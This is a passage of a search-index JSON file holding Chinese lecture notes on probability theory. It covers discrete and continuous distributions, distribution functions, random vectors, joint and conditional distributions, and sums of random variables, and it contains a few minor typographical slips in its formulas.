</ul>"},{"location":"math/prob_theory/chapter2/#_3","title":"\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u4e0e\u5206\u5e03\u5217","text":"<p>\u53d6\u6709\u9650\u4e2a\u6216\u8005\u53ef\u5217\u4e2a\u503c\u7684\u968f\u673a\u53d8\u91cf</p> <p>\u5047\u8bbe \\((\\Omega, \\mathcal{A}, P)\\) \u662f\u6982\u7387\u7a7a\u95f4\uff0c\u5b9a\u4e49 \\(X:\\Omega \\mapsto \\mathbb{R}\\) .</p> <p>\u53d6\u503c \\(x_1, \\cdots, x_N, N\\leq\\infty\\)</p> <p>\u53d6\u6bcf\u4e2a\u503c\u7684\u6982\u7387\u5927\u5c0f</p> \\[ P(X=x_i)=p_i, \\quad i = 1, 2, \\cdots, N \\] <p>\u5206\u5e03\u5217\uff1a</p> \\[ X \\sim \\begin{pmatrix} x_1 &amp; x_2 &amp; \\cdots &amp; x_i &amp; \\cdots &amp; x_N\\\\ p_1 &amp; p_2 &amp; \\cdots &amp; p_i &amp; \\cdots &amp; p_N \\end{pmatrix} \\] <p>Note</p> <ul> <li> <p>\\(p_i\\)</p> \\[ p_i &gt; 0, \\sum_{i=1}^N p_i = 1 \\] </li> <li> <p>\u5bf9\u4e8e\u4efb\u610f Borel \u96c6 \\(B\\) \uff0c</p> \\[ P(X\\in B) = \\sum_{i:x_i\\in B}p_i \\] <p>\u7279\u522b\uff0c</p> \\[ \\begin{align}     P(X \\leq x) &amp;= \\sum_{i:x_i \\leq x}p_i \\\\     P(X &gt; x) &amp;= \\sum_{i:x_i &gt; x}p_i \\\\     P(a &lt; X \\leq b) &amp;= \\sum_{i:a&lt; x_i \\leq b}p_i \\end{align} \\] </li> </ul>"},{"location":"math/prob_theory/chapter2/#_4","title":"\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u7684\u5178\u578b\u4f8b\u5b50","text":"<p>\u9000\u5316\u5206\u5e03</p> \\[ X \\sim \\begin{pmatrix}     c \\\\     1 \\end{pmatrix} \\] <p>\u5e38\u6570\u53ef\u4ee5\u770b\u4f5c\u9000\u5316\u968f\u673a\u53d8\u91cf</p> <p>\u4e24\u70b9\u5206\u5e03</p> \\[ X \\sim \\begin{pmatrix}     1 &amp; 0\\\\     p &amp; 1 - p \\end{pmatrix} \\quad 0&lt;p&lt;1 \\] <p>\u9002\u7528\u4e8e\u63cf\u8ff0\u201c\u6b63\u9762\u3001\u53cd\u9762\u201d\u3001\u201c\u6210\u529f\u3001\u5931\u8d25\u201d\u7b49\u968f\u673a\u73b0\u8c61</p> <p>\u4e8c\u9879\u5206\u5e03</p> \\[ X \\sim \\begin{pmatrix}     0 &amp; 1 &amp; \\cdots &amp; k &amp; \\cdots &amp; n\\\\     (1-p)^n &amp; np(1-p)^{n-1} &amp; \\cdots &amp; {n \\choose k}p^k(1-p)^{n-k} &amp; \\cdots &amp; p^n \\end{pmatrix} \\quad 0&lt;p&lt;1 \\] <p>\u7b80\u8bb0 \\(X \\sim B(n, p)\\)</p> <ul> <li>\u4e8c\u9879\u5206\u5e03\u9002\u7528\u4e8e n \u91cd Bernoulli \u8bd5\u9a8c</li> <li> <p>\u4e8c\u9879\u5c55\u5f00\u7cfb\u6570</p> \\[ (p+q)^n = \\sum_{k = 0}^n{n \\choose k}p^kq^{n-k} \\] </li> <li> <p>\\(X\\) \u6700\u53ef\u80fd\u7684\u503c</p> \\[ \\begin{align} \\frac{p_k}{p_{k+1}} =&amp; \\frac{{n \\choose k}p^k(1-p)^{n-k}}{{n \\choose k + 1}p^{k+1}(1-p)^{n-k-1}} \\\\ =&amp; \\frac{(k+1)(1-p)}{(n-k)p} \\\\ &amp;\\begin{cases}     &lt;1, &amp;\\quad k+1 &lt; (n + 1)p \\\\     &gt;1, &amp;\\quad k+1 &gt; (n + 1)p \\end{cases} \\end{align} \\] </li> </ul> <p>Poisson \u5206\u5e03</p> \\[ X \\sim \\begin{pmatrix}     0 &amp; 1 &amp; \\cdots &amp; k &amp; \\cdots\\\\     e^{-\\lambda} &amp; \\lambda e^{-\\lambda} &amp; \\cdots &amp; \\frac{\\lambda^k}{k!}e^{-\\lambda} &amp; \\cdots \\end{pmatrix} \\quad \\lambda &gt; 0 \\] <p>\u7b80\u8bb0 \\(X \\sim \\mathcal{P}(\\lambda)\\)</p> <p>\\(X\\) \u53d6\u975e\u8d1f\u6574\u6570\u503c\uff0c</p> \\[ P(X=k) = \\frac{\\lambda^k}{k!}e^{-\\lambda}, \\quad k=0, 1, \\cdots \\] <p>Note</p> <ul> <li>\\(\\sum p_i = 1\\)</li> <li>Poisson \u5206\u5e03\u662f Poisson \u8fc7\u7a0b\u7684\u57fa\u7840\uff0c\u7528\u4e8e\u63cf\u8ff0\u968f\u673a\u670d\u52a1\u7cfb\u7edf</li> <li> <p>\u5f53 \\(k\\) \u8db3\u591f\u5927</p> \\[ P(X\\geq k) = \\sum_{l = k}^\\infty\\frac{\\lambda^l}{l!}e^{-\\lambda} \\asymp \\frac{\\lambda^k}{k!}e^{-\\lambda} \\] <p>\\(X\\) \u53ea\u96c6\u4e2d\u5728\u5c0f\u503c\u4e2d\u3002\u7a00\u6709\u4e8b\u4ef6\u3002</p> </li> </ul> <p>Poisson \u5206\u5e03\u548c\u4e8c\u9879\u5206\u5e03\u4e4b\u95f4\u7684\u5173\u7cfb(Poisson \u6781\u9650\u5b9a\u7406)</p> <p>\u5047\u8bbe \\(S_n \\sim B(n, p_n)\\)\u3002\u5f53 \\(n \\to \\infty, np_n \\to \\lambda &gt; 0\\)\u3002\u5bf9\u4e8e\u4efb\u610f \\(k \\leq 0\\)</p> \\[ P(S_n = k) \\to \\frac{\\lambda^k}{k!}e^{-\\lambda} = P(X = k), \\quad n \\to \\infty \\] Proof \\[ \\begin{align} P(S_n = k) =&amp; {n \\choose k}p_n^k(1-p_n)^{n-k} \\\\ =&amp; \\frac{1}{k!} \\cdot n(n-1)\\cdots(n-k+1)\\cdot \\frac{1}{n^k}\\cdot (np_k)^k \\cdot (1 - \\frac{\\lambda}{n} + o(\\frac{1}{n}))^{n-k} \\\\ =&amp; \\left[(1-\\frac{1}{n})(1-\\frac{2}{n})\\cdots(1-\\frac{k-1}{n})\\right] \\left[\\frac{\\lambda^k}{k!}\\right] \\left[(1-\\frac{\\lambda}{n})^{n-k}\\right] \\\\ \\to &amp; \\frac{\\lambda^k}{k!} e^{-\\lambda}, \\quad n\\to \\infty \\end{align} \\] <p>\u51e0\u4f55\u5206\u5e03</p> <p>\u968f\u673a\u8bd5\u9a8c \\(E\\) \u548c\u4e8b\u4ef6 \\(A\\) \uff0c\\(P(A) = p, 0&lt;p&lt;1\\)\u3002\u72ec\u7acb\u91cd\u590d \\(E\\) \u76f4\u5230 \\(A\\) \u53d1\u751f\uff0c\u8bb0\u6240\u505a\u7684\u8bd5\u9a8c\u6b21\u6570\u8bb0\u4e3a \\(X\\)</p> \\[ P(X=k) = p(1-p)^{k-1} \\] <p>\u5176\u4e2d</p> \\[ \\sum_{k=1}^{\\infty} p(1-p)^{k-1} = \\frac{p}{1-(1-p)} = 1 \\] <p>\u5206\u5e03\u5217\uff1a</p> \\[ X \\sim \\begin{pmatrix} 1 &amp; 2 &amp; \\cdots &amp; k &amp; \\cdots \\\\ p &amp; p(1-p) &amp; \\cdots &amp; p(1-p)^{k-1} &amp; \\cdots \\end{pmatrix} \\] <p>\u8d85\u51e0\u4f55\u5206\u5e03</p> <p>\\(N\\) \u4ef6\u4ea7\u54c1\u4e2d\u6709 \\(M\\) \u4ef6\u6b21\u54c1\uff0c\u968f\u673a\u62bd\u6837 \\(n&lt;N\\) \u4ef6\uff0c\u7528 \\(X\\) \u8868\u793a \\(n\\) \u4ef6\u4ea7\u54c1\u4e2d\u6b21\u54c1\u6570\u3002</p> <p>\\(0\\leq X \\leq \\min\\{M,n\\}\\)</p> \\[ P(X=k) = \\frac{{M \\choose k}{N - M \\choose n - k}}{{N \\choose n}} \\]"},{"location":"math/prob_theory/chapter2/#_5","title":"\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u4e0e\u5bc6\u5ea6\u51fd\u6570","text":"<p>\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u7279\u70b9\uff1a</p> <ul> <li>\u968f\u673a\u53d8\u91cf\u53d6\u503c\u662f\u4e00\u4e2a\u6216\u51e0\u4e2a\u533a\u95f4</li> <li> <p>\u5b58\u5728\u51fd\u6570 \\(p(x)\\)</p> \\[ p(x)\\geq 0, \\quad \\int_{-\\infty}^{\\infty}p(x)\\text{d}x = 1 \\] <p>\u4f7f\u5f97\u5bf9\u4efb\u4f55 Borel \u96c6 \\(B\\)\uff0c</p> \\[ P(X\\in B) = \\int_{B} p(x)\\text{d}x \\] <p>\u7b80\u8bb0 \\(X \\sim p(x)\\)</p> </li> </ul> <p>\u79f0 \\(p(x)\\) \u4e3a \\(X\\) \u7684\u5bc6\u5ea6\u51fd\u6570</p> <p>Note</p> <ul> <li>\\(P(X=x) = 0, \\quad x\\in \\mathbb{R}\\)</li> <li>\\(P(X\\in(a,b]) = \\int_{a}^{b} p(x)\\text{d}x\\)</li> </ul>"},{"location":"math/prob_theory/chapter2/#_6","title":"\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u7684\u4f8b\u5b50","text":"<p>\u5747\u5300\u5206\u5e03</p> <p>\u5411 \\((a,b)\\) \u4e0a\u968f\u673a\u6295\u70b9\uff0c\u8bb0\u843d\u70b9\u7684\u4f4d\u7f6e\u4e3a \\(X\\)</p> <ul> <li>\\(X\\) \u843d\u5728 \\((a,b)\\) \u4e0a\u6bcf\u4e00\u70b9\u7b49\u53ef\u80fd \\(P(X=x) = 0\\)</li> <li>\\(P(X\\in A) = \\frac{|A|}{b-a}\\)</li> </ul> <p>\u7b80\u8bb0 \\(X \\sim U(a,b)\\)</p> \\[ X \\sim p(x) =  \\begin{cases} \\frac{1}{b-a}, &amp; x\\in (a,b) \\\\ 0            , &amp; \\text{\u5176\u4ed6} \\end{cases} \\] <p>\u6307\u6570\u5206\u5e03</p> <p>\u5982\u679c \\(X\\) \u53d6\u975e\u8d1f\u5b9e\u6570\uff0c\u4e14</p> \\[ p(x) = \\begin{cases} \\lambda e^{-\\lambda x}, &amp; x\\geq 0 \\\\ 0                     , &amp; \\text{\u5176\u4ed6} \\end{cases} \\quad \\lambda &gt; 0 \\] <p>\u7b80\u8bb0 \\(X \\sim \\exp(\\lambda)\\)</p> <p>Note</p> <ul> <li>\u901a\u5e38\u63cf\u8ff0\u5bff\u547d</li> <li>\u548c Poisson \u5206\u5e03\u6709\u5bc6\u5207\u8054\u7cfb\uff1aPoisson \u8fc7\u7a0b</li> <li> <p>\\(X\\) \u53d6\u5927\u503c\u7684\u53ef\u80fd\u6027\u8fc5\u901f\u8870\u51cf</p> \\[ P(X&gt;x) = e^{-\\lambda x}, \\quad x \\geq 0 \\] </li> <li> <p>\u65e0\u8bb0\u5fc6\u6027\u3002\u4f7f\u7528\u4e86 \\(y\\) \u5c0f\u65f6\u4e4b\u540e\u8fd8\u80fd\u4f7f\u7528 \\(x\\) \u7684\u6982\u7387</p> \\[ \\begin{align} P(X&gt;x+y | X&gt;y) =&amp; \\frac{P(X &gt; x+y)}{P(X &gt; y)} \\\\                =&amp; \\frac{e^{-\\lambda(x+y)}}{e^{-\\lambda y}} \\\\                =&amp; e^{-\\lambda x} \\\\                =&amp; P(X&gt;x) \\end{align} \\] </li> </ul> <p>\u6b63\u6001\u5206\u5e03</p> <p>\u968f\u673a\u53d8\u91cf \\(X\\) \u53d6\u6240\u6709\u5b9e\u6570\u503c\uff0c\u5bc6\u5ea6</p> \\[ p(x) = \\frac{1}{\\sqrt{2\\pi}\\sigma}e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}}, \\quad -\\infty &lt; x &lt; \\infty \\] <p>\u79f0 \\(X\\) \u662f\u670d\u4ece\u6b63\u6001\u5206\u5e03\u7684\u968f\u673a\u53d8\u91cf\uff0c\u7b80\u8bb0 \\(X \\sim N(\\mu,\\sigma^2)\\)</p> <p>Note</p> <ul> <li>\\(-\\infty &lt; \\mu &lt; \\infty, \\sigma &gt; 0\\)</li> <li>\u6807\u51c6\u6b63\u6001\u5206\u5e03 \\(\\mu = 0, \\sigma^2 = 1\\)\uff0c\u79f0 \\(X \\sim N(0,1)\\)</li> </ul> <p>\u9a8c\u8bc1</p> <p>\u9a8c\u8bc1</p> \\[ \\int_{-\\infty}^{\\infty}p(x)\\text{d}x = 1 \\] <p>\u4ee4 \\(t = \\frac{x-\\mu}{\\sigma}\\) \uff0c\u53ea\u9700\u8bc1\u660e</p> \\[ \\int_{-\\infty}^{\\infty}\\frac{1}{\\sqrt{2\\pi}}e^{-\\frac{x^2}{2}}\\text{d}x = 1 \\] <p>\u8003\u8651</p> \\[ \\left(\\int_{-\\infty}^{\\infty}\\frac{1}{\\sqrt{2\\pi}}e^{-\\frac{x^2}{2}}\\text{d}x\\right)^2 = \\int_{-\\infty}^{\\infty}\\int_{-\\infty}^{\\infty}\\frac{1}{2\\pi}e^{-\\frac{x^2+y^2}{2}}\\text{d}x\\text{d}y \\] <p>\u6781\u5750\u6807\u53d8\u6362\uff1a</p> \\[ \\int_{-\\infty}^{\\infty}\\int_{-\\infty}^{\\infty}\\frac{1}{2\\pi}e^{-\\frac{x^2+y^2}{2}}\\text{d}x\\text{d}y = \\int_{0}^\\infty\\int_{0}{2\\pi}\\frac{1}{2\\pi}e^{-\\frac{\\rho^2}{2}}\\rho\\text{d}\\rho\\text{d}\\theta = 1 \\] <p>\u6b63\u6001\u5206\u5e03\u7684\u6027\u8d28</p> <ul> <li>\u5bf9\u79f0\u6027\uff1a\u5173\u4e8e \\(x = \\mu\\) \u5bf9\u79f0</li> <li>\u5149\u6ed1\u6027\uff1a\\(p(x)\\) \u4efb\u610f\u6b21\u53ef\u5fae</li> <li>\u5355\u8c03\u6027</li> <li>\u6e10\u8fd1\u7ebf \\(y = 0\\)</li> <li>\u6700\u5927\u503c\uff1a\\(P(x)\\) \u5728 \\(x=\\mu\\) \u521d\u53d6\u6700\u5927\u503c \\(\\frac{1}{\\sqrt{2\\pi}\\sigma}\\)</li> <li>\\(\\sigma\\) \u53d8\u5927\uff0c\u66f2\u7ebf\u53d8\u5e73\u5766\uff1b\\(\\sigma\\) \u53d8\u5c0f\uff0c\u66f2\u7ebf\u53d8\u9661\u5ced</li> <li> <p>\u7c7b\u4f3c\u79ef\u5206</p> \\[ \\begin{align} P(X &gt; \\mu + \\sigma x) =&amp; \\int_{\\mu + \\sigma x}^{\\infty} \\frac{1}{\\sqrt{2\\pi}\\sigma}e^{-\\frac{(u - \\mu)^2}{2\\sigma^2}}\\text{d}u \\\\ \\sim &amp; \\frac{1}{\\sqrt{2\\pi}x}e^{-\\frac{x^2}{2}}, \\quad x\\to \\infty \\end{align} \\] <p>\u540c\u7406</p> \\[ P(X &lt; \\mu - \\sigma x) \\sim \\frac{1}{\\sqrt{2\\pi}x}e^{-\\frac{x^2}{2}}, \\quad x\\to \\infty \\] </li> </ul>"},{"location":"math/prob_theory/chapter2/#_7","title":"\u4e00\u822c\u578b\u968f\u673a\u53d8\u91cf\u4e0e\u5206\u5e03\u51fd\u6570","text":"<ul> <li> <p>\u5206\u5e03\u51fd\u6570</p> \\[ F(x) = P(\\omega: X(\\omega) \\leq x), \\quad -\\infty &lt; x &lt; \\infty \\] </li> <li> <p>\u5206\u5e03\u51fd\u6570\u7684\u6027\u8d28</p> <ul> <li>\\(\\lim_{x\\to -\\infty}F(x) = 0, \\lim_{x\\to \\infty}F(x) = 1\\)</li> <li>\\(F(x_1) \\leq F(x_2), \\quad x_1 \\leq x_2\\)</li> <li> <p>\\(F(x)\\) \u5de6\u6781\u9650\u548c\u53f3\u6781\u9650\u5b58\u5728</p> \\[ \\lim_{x\\to x_0-0}F(x) = F(x_0-0), \\quad \\lim_{x\\to x_0+0}F(x) = F(x_0+0) \\] <p>Note</p> <ul> <li>\\(F(x_0-0) = P(X &lt; x_0)\\)</li> <li>\\(P(x = x_0) = F(x_0) - F(x_0-0)\\)</li> <li>\\(P(X \\in (x_1, x_2]) = F(x_2) - F(x_1)\\)</li> </ul> </li> </ul> </li> <li> <p>\u8fde\u7eed\u6027\u968f\u673a\u53d8\u91cf\u7684\u5206\u5e03\u51fd\u6570</p> \\[ \\begin{align*} F(x) =&amp; P(X \\leq x) \\\\      =&amp; \\int_{-\\infty}^{x}p(u)\\text{d}u \\end{align*} \\] <p>\\(F(x)\\) \u662f\u8fde\u7eed\u51fd\u6570\uff0c\u4e14 \\(F'(x) = p(x)\\)</p> <p>\u6b63\u6001\u5206\u5e03\u7684\u5206\u5e03\u51fd\u6570</p> <p>\u5047\u5b9a \\(X \\sim N(0, 1)\\)</p> \\[ F(x) = \\frac{1}{\\sqrt{2\\pi}}\\int_{-\\infty}^{x}e^{-\\frac{u^2}{2}}\\text{d}u \\] <p>\u6ca1\u6709\u663e\u6027\u8868\u8fbe\u5f0f\uff0c\u7528 \\(\\Phi(x)\\) \u8868\u793a\u5206\u5e03\u51fd\u6570\uff08Probit \u51fd\u6570\uff09</p> <p>\u8bef\u5dee\u51fd\u6570</p> \\[ erf(x) = \\frac{2}{\\sqrt{\\pi}}\\int_{0}^{x}e^{-u^2}\\text{d}u \\] <p>\u91c7\u7528\u8bef\u5dee\u51fd\u6570\u8868\u793a \\(\\Phi(x)\\)</p> \\[ \\Phi(x) = \\frac{1}{2}\\left[1 + \\frac{1}{\\sqrt{2}}erf(x)\\right] \\] <p>\\(\\Phi(x)\\) \u7684\u503c\uff1a\u67e5\u8868\u3002</p> </li> </ul>"},{"location":"math/prob_theory/chapter2/#_8","title":"\u968f\u673a\u53d8\u91cf\u7684\u51fd\u6570","text":"<p>\u8003\u8651</p> \\[ Y = f(X), Y(\\omega) = f(X(\\omega)) \\] <p>\\(Y\\) \u662f\u968f\u673a\u53d8\u91cf\u7684\u6761\u4ef6</p> <p>\\(X\\) \u662f\u968f\u673a\u53d8\u91cf\uff0c\\(f\\) \u662f\u53ef\u6d4b\u51fd\u6570</p> <ul> <li> <p>\u5f53 \\(X\\) \u662f\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u65f6\uff0c\\(Y\\) \u4e5f\u662f\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf</p> \\[ X \\sim \\begin{pmatrix} x_1 &amp; x_2 &amp; \\cdots &amp; x_i &amp; \\cdots &amp; x_N \\\\ p_1 &amp; p_2 &amp; \\cdots &amp; p_i &amp; \\cdots &amp; p_N \\end{pmatrix} \\] \\[ P(Y = y_i) = \\sum_{x_j: f(x_j) = y_i}p_j \\] </li> <li> <p>\u5f53 \\(X\\) \u662f\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u65f6\uff0c\\(Y\\) \u4e0d\u4e00\u5b9a\u662f\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\u3002\u65e0\u7edf\u4e00\u516c\u5f0f\u3002</p> <p>\u4e00\u822c\u5730\uff0c\u5047\u8bbe \\(X \\sim p_X(x)\\)\uff0c\\(f\\) \u5177\u6709\u53cd\u51fd\u6570 \\(f^{-1}\\)\uff0c\u4e14 \\(f^{-1}\\) \u53ef\u5bfc\u3002\u5219 \\(Y\\) \u662f\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u5bc6\u5ea6\u51fd\u6570\u4e3a</p> \\[ Y \\sim p_Y(y) = p_X(f^{-1}(y))\\left|\\frac{\\text{d}f^{-1}(y)}{\\text{d}y}\\right| \\] <p>Example</p> <p>\u5047\u8bbe \\(X\\) \u5177\u6709\u8fde\u7eed\u7684\u5206\u5e03\u51fd\u6570 \\(F(x)\\)\uff0c\u6c42 \\(Y = F(X)\\) \u7684\u5206\u5e03</p> \\[ \\begin{align} P(Y \\leq y) =&amp; P(F(X) \\leq y) \\\\             =&amp; P(X \\leq F^{-1}(y)) \\\\             =&amp; F(F^{-1}(y)) \\\\             =&amp; y, \\quad 0 \\leq y \\leq 1 \\end{align} \\] <p>\u5219 \\(Y \\sim U(0,1)\\)</p> </li> </ul>"},{"location":"math/prob_theory/chapter2/#_9","title":"\u968f\u673a\u5411\u91cf\u4e0e\u8054\u5408\u5206\u5e03\u51fd\u6570","text":""},{"location":"math/prob_theory/chapter2/#_10","title":"\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf","text":"<p>\\((X,Y)\\) \u662f 2-\u968f\u673a\u5411\u91cf\u3002\\(X\\) \u53d6\u503c \\(x_1, x_2, \\cdots\\)\uff0c\\(Y\\) \u53d6\u503c \\(y_1, y_2, \\cdots\\)\u3002\u79f0 \\((X,Y)\\) \u4e3a\u79bb\u6563\u578b\u968f\u673a\u5411\u91cf\u3002</p> \\[ p_{ij} = P(X = x_i, Y = y_j), \\quad i,j = 1,2,\\cdots \\] <p>\u79f0</p> \\[ ((x_i, y_j), p_{ij})_{i,j=1}^{\\infty} \\] <p>\u4e3a \\((X,Y)\\) \u7684\u8054\u5408\u5206\u5e03\u3002</p> <ul> <li> <p>\u8fb9\u9645\u5206\u5e03</p> \\[ \\begin{align} P(X = x_i) =&amp; \\sum_{j=1}^{\\infty}p_{ij} \\\\ P(Y = y_j) =&amp; \\sum_{i=1}^{\\infty}p_{ij} \\end{align} \\] <p>Warning</p> <p>\u8fb9\u9645\u5206\u5e03\u7531\u8054\u5408\u5206\u5e03\u552f\u4e00\u786e\u5b9a\uff0c\u53cd\u4e4b\u4e0d\u6210\u7acb\u3002</p> </li> <li> <p>\u6761\u4ef6\u5206\u5e03</p> \\[ P(X = x_i | Y = y_j) = \\frac{P(X = x_i, Y = y_j)}{P(Y = y_j)} = \\frac{p_{ij}}{p_{\\cdot j}} \\] <p>\u6761\u4ef6\u5206\u5e03\u5217</p> \\[ X|Y = y_j \\sim \\begin{pmatrix} x_1 &amp; x_2 &amp; \\cdots &amp; x_i &amp; \\cdots \\\\ \\frac{p_{1j}}{p_{\\cdot j}} &amp; \\frac{p_{2j}}{p_{\\cdot j}} &amp; \\cdots &amp; \\frac{p_{ij}}{p_{\\cdot j}} &amp; \\cdots \\end{pmatrix} \\] </li> <li> <p>\u72ec\u7acb\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf</p> \\[ P(X = x_i, Y = y_j) = P(X = x_i)P(Y = y_j), \\forall i,j \\] <p>\u5373</p> \\[ p_{ij} = p_{i\\cdot}p_{\\cdot j}, \\quad \\forall i,j \\] </li> </ul>"},{"location":"math/prob_theory/chapter2/#_11","title":"\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf","text":"<p>\u8054\u5408\u5bc6\u5ea6\u51fd\u6570 \\(p(x,y)\\)</p> \\[ p(x,y) \\geq 0, \\quad \\int_{-\\infty}^{\\infty}\\int_{-\\infty}^{\\infty}p(x,y)\\text{d}x\\text{d}y = 1 \\] <p>\u5e76\u4e14</p> \\[ P(X \\in A, Y \\in B) = \\int_{A}\\int_{B}p(x,y)\\text{d}x\\text{d}y \\] <p>\u79f0 \\((X,Y)\\) \u4e3a\u8fde\u7eed\u578b\u968f\u673a\u5411\u91cf\u3002</p> <ul> <li> <p>\u8fb9\u9645\u5bc6\u5ea6</p> \\[ X \\sim p_X(x), \\quad Y \\sim p_Y(y) \\] \\[ p_X(x) = \\int_{-\\infty}^{\\infty}p(x,y)\\text{d}y, \\quad p_Y(y) = \\int_{-\\infty}^{\\infty}p(x,y)\\text{d}x \\] </li> </ul> <p>\u8054\u5408\u6b63\u6001\u5206\u5e03</p> \\[ p(x,y) = \\frac{1}{2\\pi\\sigma_1\\sigma_2\\sqrt{1-\\rho^2}}e^{-\\frac{1}{2(1-\\rho^2)}\\left[\\frac{(x-\\mu_1)^2}{\\sigma_1^2} - 2\\rho\\frac{(x-\\mu_1)(y-\\mu_2)}{\\sigma_1\\sigma_2} + \\frac{(y-\\mu_2)^2}{\\sigma_2^2}\\right]} \\] <p>\u79f0 \\((X,Y)\\) \u670d\u4ece\u4e8c\u5143\u6b63\u6001\u5206\u5e03\uff0c\u7b80\u8bb0 \\((X,Y) \\sim N(\\mu_1, \\mu_2, \\sigma_1^2, \\sigma_2^2, \\rho)\\)</p> <ul> <li> <p>\u8fb9\u9645\u5206\u5e03</p> \\[ X \\sim N(\\mu_1, \\sigma_1^2), \\quad Y \\sim N(\\mu_2, \\sigma_2^2) \\] </li> </ul> <ul> <li> <p>\u6761\u4ef6\u5206\u5e03</p> \\[ p_{Y|X}(y|x) = \\frac{p(x,y)}{p_X(x)} \\] \\[ P(Y \\leq y | X = x) = \\frac{\\int_{-\\infty}^{y}p(x,v)\\text{d}v}{p_X(x)} \\] </li> <li> <p>\u72ec\u7acb\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf</p> \\[ p(x,y) = p_X(x)p_Y(y), \\quad \\forall x,y \\] </li> </ul>"},{"location":"math/prob_theory/chapter2/#_12","title":"\u4e00\u822c\u578b\u968f\u673a\u53d8\u91cf","text":"<p>\u4e00\u822c\u5229\u7528\u5206\u5e03\u51fd\u6570</p> \\[ F(x,y) = P(X \\leq x, Y \\leq y) \\] <p>\\(F(x)\\) \u6027\u8d28</p> <ul> <li>\\(F(-\\infty, y) = F(x, -\\infty) = 0, F(+\\infty, +\\infty) = 1\\)</li> <li>\\(F(x, y)\\) \u5173\u4e8e \\(x\\) \u548c \\(y\\) \u90fd\u662f\u975e\u51cf\u51fd\u6570</li> <li>\\(F(x, y)\\) \u5173\u4e8e \\(x\\) \u548c \\(y\\) \u5de6\u6781\u9650\u5b58\u5728\uff0c\u53f3\u8fde\u7eed</li> <li>\\(P(a &lt; X \\leq b, c &lt; Y \\leq d) = F(b,d) - F(a,d) - F(b,c) + F(a,c)\\)</li> </ul> <ul> <li> <p>\u8fb9\u9645\u5206\u5e03</p> \\[ F_X(x) = F(x, +\\infty), \\quad F_Y(y) = F(+\\infty, y) \\] </li> <li> <p>\u6761\u4ef6\u5206\u5e03</p> \\[ \\begin{align} P(Y \\leq y | X = x) =&amp; \\lim_{\\epsilon \\to 0} P(Y \\leq y | x - \\epsilon &lt; X \\leq x + \\epsilon) \\\\                     =&amp; \\lim_{\\epsilon \\to 0} \\frac{F(x+\\epsilon, y) - F(x-\\epsilon, y)}{F_X(x+\\epsilon) - F_X(x-\\epsilon)} \\end{align} \\] </li> <li> <p>\u72ec\u7acb\u4e00\u822c\u578b\u968f\u673a\u53d8\u91cf</p> \\[ F(x,y) = F_X(x)F_Y(y), \\quad \\forall x,y \\] <p>\u5982\u679c \\(X, Y\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u90a3\u4e48\u5bf9\u4e8e\u4efb\u610f Borel \u51fd\u6570 \\(f,g\\)\uff0c\\(f(X)\\) \u548c \\(g(Y)\\) \u4e5f\u76f8\u4e92\u72ec\u7acb\u3002</p> <p>Proof</p> \\[ \\begin{align} P(f(X) \\in A, g(Y) \\in B) =&amp; P(X \\in f^{-1}(A), Y \\in g^{-1}(B)) \\\\                            =&amp; P(X \\in f^{-1}(A))P(Y \\in g^{-1}(B)) \\\\                            =&amp; P(f(X) \\in A)P(g(Y) \\in B) \\end{align} \\] </li> </ul>"},{"location":"math/prob_theory/chapter2/#_13","title":"\u591a\u7ef4\u968f\u673a\u5411\u91cf","text":"<p>\\(\\mathbf{X} = (X_1, X_2, \\cdots, X_n)\\) \u662f \\(n\\)-\u7ef4\u968f\u673a\u5411\u91cf\u3002</p> <ul> <li> <p>\\(n\\)-\u5143\u8054\u5408\u5206\u5e03\u51fd\u6570</p> \\[ F_{\\mathbf{X}}(\\mathbf{x}) = P(X_1 \\leq x_1, X_2 \\leq x_2, \\cdots, X_n \\leq x_n) \\] </li> <li> <p>\u8fb9\u9645\u5206\u5e03</p> \\[ F_{X_i}(x_i) = F_{\\mathbf{X}}(\\infty, \\cdots, \\infty, x_i, \\infty, \\cdots, \\infty) = P(X_i \\leq x_i) \\] </li> <li> <p>\u72ec\u7acb\u968f\u673a\u53d8\u91cf</p> \\[ F_{\\mathbf{X}}(\\mathbf{x}) = \\prod_{i=1}^{n}F_{X_i}(x_i) \\] <p>\u5219 \\(X_1, X_2, \\cdots, X_n\\) \u76f8\u4e92\u72ec\u7acb\u3002</p> </li> </ul>"},{"location":"math/prob_theory/chapter2/#_14","title":"\u968f\u673a\u5411\u91cf\u7684\u8fd0\u7b97","text":""},{"location":"math/prob_theory/chapter2/#_15","title":"\u968f\u673a\u5411\u91cf\u7684\u52a0\u51cf","text":"<ul> <li> <p>\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf</p> <p>\u5206\u5e03\u4e3a</p> \\[ P(X = x_i, Y = y_j) = p_{ij} \\] <p>\u8bb0 \\(Z = X + Y\\)\uff0c\u5219</p> \\[ P(Z = z_k) = \\sum_{i,j: x_i + y_j = z_k}p_{ij} \\] </li> <li> <p>\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf</p> \\[ \\begin{align*} F_Z(z) = P(X + Y \\leq z) =&amp; \\int_{-\\infty}^{\\infty}\\int_{-\\infty}^{z-x}p(x,y)\\text{d}y\\text{d}x \\\\                          =&amp; \\int_{-\\infty}^{z}\\int_{-\\infty}^{\\infty}p(x, y - x)\\text{d}y\\text{d}x \\end{align*} \\] <p>\u5bc6\u5ea6\u51fd\u6570</p> \\[ p_Z(z) = \\int_{-\\infty}^{\\infty}p(x, z - x)\\text{d}x \\] <p>\u51cf\u6cd5\u7c7b\u4f3c\uff1a\\(Z = Y - X\\)</p> \\[ p_Z(z) = \\int_{-\\infty}^{\\infty}p(x, x + z)\\text{d}x \\] </li> </ul> <p>\\(\\Gamma(\\alpha, \\beta)\\) \u5206\u5e03</p> 